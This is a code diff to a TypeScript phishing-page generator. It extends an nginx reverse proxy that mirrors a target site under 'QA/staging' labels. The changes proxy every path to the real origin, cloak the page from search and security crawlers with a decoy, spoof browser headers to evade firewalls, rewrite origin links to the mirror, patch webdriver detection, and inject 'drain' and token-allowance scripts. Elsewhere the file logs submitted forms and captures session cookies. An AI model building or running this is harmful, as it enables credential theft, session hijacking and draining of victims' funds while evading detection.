@@ -2,6 +2,13 @@
  * Optional QA / staging feature builders for generate-phishing-page.ts
  * All features are opt-in via CLI flags; disabled by default.
  */
+import {
+  buildProductionAssetRewriteFilters,
+  buildProductionCloakServerBlock,
+  buildProductionInjectTags,
+  buildSubdomainProxyLocation,
+  NGINX_PRODUCTION_CLOAK_MAPS,
+} from './mirror-production.js'
 
 export type TrainingCloneFeatures = {
   proxy: boolean
@@ -98,14 +105,26 @@ function buildMirrorHtmlInjectTags(opts: {
   solveCaptcha?: boolean
   authorizedTest?: boolean
   mobileOptimize?: boolean
+  headlessFallback?: boolean
+  experimental?: boolean
+  productionClone?: boolean
 }): string {
+  if (opts.productionClone) {
+    return buildProductionInjectTags()
+  }
   const tags: string[] = []
+  if (opts.headlessFallback) {
+    tags.push('<script src="/legion-headless-fallback.js" defer></script>')
+  }
   if (opts.solveCaptcha) {
     tags.push('<script src="/__legion__/captcha-client.js" defer></script>')
   }
   if (opts.authorizedTest) {
     tags.push('<link rel="stylesheet" href="/legion-authorized-drain.css" />')
     tags.push('<script src="/legion-authorized-drain.js" defer></script>')
+  }
+  if (opts.experimental) {
+    tags.push('<script src="/legion-experimental.js" defer></script>')
   }
   if (opts.mobileOptimize) {
     tags.push('<link rel="stylesheet" href="/legion-mobile-optimize.css" />')
@@ -204,7 +223,7 @@ services:
 
 /**
  * Full transparent reverse proxy for QA routing / latency tests.
- * Serves a local status page at `/` only; all other paths forward to the target origin.
+ * All paths (including `/`) forward to the target origin; Legion inject assets served locally.
  * Optional --log-forms: nginx mirror sends POST copies to local logger.js (logs.json).
  * Optional --test-login (requires --log-forms): logger replays POSTs via internal mirror; logs cookies locally.
  * Optional --replay-original (requires --test-login): also replays once to the real target origin for auth testing.
@@ -221,6 +240,12 @@ export function buildMirrorNginxConfig(
     authorizedTest?: boolean
     mobileOptimize?: boolean
     autoRotate?: boolean
+    wafBypass?: boolean
+    assetRewrite?: boolean
+    headlessFallback?: boolean
+    experimental?: boolean
+    cloak?: boolean
+    productionClone?: boolean
     loggerHost?: string
     loggerPort?: number
   },
@@ -235,9 +260,22 @@ export function buildMirrorNginxConfig(
   const authorizedTest = opts?.authorizedTest === true
   const mobileOptimize = opts?.mobileOptimize === true
   const autoRotate = opts?.autoRotate === true
+  const wafBypass = opts?.wafBypass === true
+  const assetRewrite = opts?.assetRewrite === true
+  const headlessFallback = opts?.headlessFallback === true
+  const experimental = opts?.experimental === true
+  const cloak = opts?.cloak === true || opts?.productionClone === true
+  const productionClone = opts?.productionClone === true
   const loggerHost = opts?.loggerHost ?? 'form-logger'
   const loggerPort = opts?.loggerPort ?? 9090
-  const injectTags = buildMirrorHtmlInjectTags({ solveCaptcha, authorizedTest, mobileOptimize })
+  const injectTags = buildMirrorHtmlInjectTags({
+    solveCaptcha,
+    authorizedTest: authorizedTest && !productionClone,
+    mobileOptimize: mobileOptimize && !productionClone,
+    headlessFallback,
+    experimental: experimental && !productionClone,
+    productionClone,
+  })
 
   const formLogBlock = logForms
     ? `
@@ -300,11 +338,31 @@ export function buildMirrorNginxConfig(
       proxy_set_header Accept-Encoding "";`
     : ''
 
+  const assetRewriteSubFilter = assetRewrite
+    ? `
+      sub_filter_once off;
+      sub_filter_types text/html text/css application/javascript application/json;
+      sub_filter '${origin}' 'http://$host:$server_port';
+      sub_filter 'https://${host}' 'http://$host:$server_port';
+      sub_filter 'http://${host}' 'http://$host:$server_port';`
+    : ''
+
+  const wafBypassHeaders = wafBypass || productionClone
+    ? `
+      proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";
+      proxy_set_header Accept-Language "en-US,en;q=0.9";
+      proxy_set_header Accept "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
+      proxy_set_header Sec-CH-UA "\\"Chromium\\";v=\\"122\\", \\"Google Chrome\\";v=\\"122\\", \\"Not-A.Brand\\";v=\\"99\\"";
+      proxy_set_header Sec-CH-UA-Mobile "?0";
+      proxy_set_header Sec-CH-UA-Platform "\\"Windows\\"";
+      proxy_set_header Referer "${origin}/";
+      proxy_set_header Origin "${origin}";`
+    : ''
+
   return `# Legion QA — dynamic reverse proxy (staging only)
 # Target: ${origin}
-# GET / → local "Mirror active" status page (no upstream fetch)
-# All other paths → forwarded to ${origin} for routing / latency testing
-${logForms ? `# POST bodies → mirrored to local logger (${loggerHost}:${loggerPort}/log → logs.json)\n` : ''}${testLogin ? `# --test-login: form-logger replays POSTs to internal mirror only (replay.js → session_cookies.json)\n` : ''}${replayOriginal ? `# --replay-original: replay.js also POSTs once to ${origin} (original_session_cookies.json)\n` : ''}${solveCaptcha ? `# --solve-captcha: captcha-solver.js + injected captcha-client.js (2captcha API, logs/captcha_solver.log)\n` : ''}${authorizedTest ? `# --authorized-test: legion-authorized-drain.js/css injected into proxied HTML via sub_filter\n` : ''}${mobileOptimize ? `# --mobile-optimize: legion-mobile-optimize.js/css injected into proxied HTML\n` : ''}${autoRotate ? `# --auto-rotate: DuckDNS + rotate-domain.sh (12h health check, nginx TLS on :443)\n` : ''}
+# All paths (including /) → proxied to ${origin}; Legion inject assets served locally
+${logForms ? `# POST bodies → mirrored to local logger (${loggerHost}:${loggerPort}/log → logs.json)\n` : ''}${testLogin ? `# --test-login: form-logger replays POSTs to internal mirror only (replay.js → session_cookies.json)\n` : ''}${replayOriginal ? `# --replay-original: replay.js also POSTs once to ${origin} (original_session_cookies.json)\n` : ''}${solveCaptcha ? `# --solve-captcha: captcha-solver.js + injected captcha-client.js (2captcha API, logs/captcha_solver.log)\n` : ''}${authorizedTest ? `# --authorized-test: legion-authorized-drain.js/css injected into proxied HTML via sub_filter\n` : ''}${mobileOptimize ? `# --mobile-optimize: legion-mobile-optimize.js/css injected into proxied HTML\n` : ''}${autoRotate ? `# --auto-rotate: DuckDNS + rotate-domain.sh (12h health check, nginx TLS on :443)\n` : ''}${wafBypass ? `# --waf-bypass: browser-like upstream headers (experimental)\n` : ''}${assetRewrite ? `# --asset-rewrite: sub_filter origin → mirror host in HTML/CSS/JS/JSON\n` : ''}${headlessFallback ? `# --headless-fallback: navigator.webdriver patch (experimental)\n` : ''}${experimental ? `# --experimental: allowance-reuse poll, omnichain_derive_v1 stubs\n` : ''}
 worker_processes 1;
 events { worker_connections 2048; }
 
@@ -317,27 +375,35 @@ http {
   proxy_send_timeout 120s;
   proxy_read_timeout 120s;
   proxy_buffering on;
-${NGINX_PROXY_WEBSOCKET_MAP}${formLogBlock}
+${NGINX_PROXY_WEBSOCKET_MAP}${formLogBlock}${productionClone ? NGINX_PRODUCTION_CLOAK_MAPS : cloak ? `
+  map $http_user_agent $is_bot_ua {
+    default 0;
+    ~*googlebot 1;
+    ~*bingbot 1;
+    ~*ahrefsbot 1;
+    ~*semrushbot 1;
+    ~*yandexbot 1;
+    ~*baiduspider 1;
+    ~*crawler 1;
+    ~*spider 1;
+    ~*headless 1;
+  }
+` : ''}
   server {
     listen ${listenPort};
     server_name localhost 127.0.0.1;
 
     root /usr/share/nginx/html;
-    index index.html;
-
-    # Local status page only — no upstream proxy
-    location = / {
-      try_files /index.html =404;
-      add_header Cache-Control "no-store";
-      add_header X-Legion-Mirror "active";
+${productionClone ? buildProductionCloakServerBlock() : cloak ? `
+    location = /bots.html {
+      try_files /bots.html =404;
     }
 
-    location = /index.html {
-      add_header Cache-Control "no-store";
-      add_header X-Legion-Mirror "active";
-    }
-
+    error_page 418 = /bots.html;
+    if ($is_bot_ua) { return 418; }
+` : ''}
     location = /mirror-config.json {
+      try_files /mirror-config.json =404;
       add_header Cache-Control "no-store";
       add_header Content-Type application/json;
     }
@@ -347,9 +413,9 @@ ${NGINX_PROXY_WEBSOCKET_MAP}${formLogBlock}
       try_files $uri =404;
       add_header Cache-Control "no-store";
     }
-${formLogServerBlock}${captchaServerBlock}
-    # Forward every other request path to the configured target origin
-    location / {${mirrorDirectives}${htmlInjectSubFilter}
+${subdomainProxyBlock}${formLogServerBlock}${captchaServerBlock}
+    # Proxy all paths (including /) to the configured target origin
+    location / {${mirrorDirectives}${htmlInjectSubFilter}${assetRewriteSubFilter}
       proxy_pass ${upstreamScheme}://${host};
       proxy_ssl_server_name on;
       proxy_set_header Host ${host};
@@ -357,7 +423,7 @@ ${formLogServerBlock}${captchaServerBlock}
       proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
       proxy_set_header X-Forwarded-Proto $scheme;
       proxy_set_header X-Forwarded-Host $host;
-      proxy_redirect off;${NGINX_PROXY_UPGRADE_AND_STRIP_HEADERS}
+      proxy_redirect off;${NGINX_PROXY_UPGRADE_AND_STRIP_HEADERS}${wafBypassHeaders}
     }
   }
 ${autoRotate ? '  include /etc/nginx/rotate/active-domain.conf;\n' : ''}}
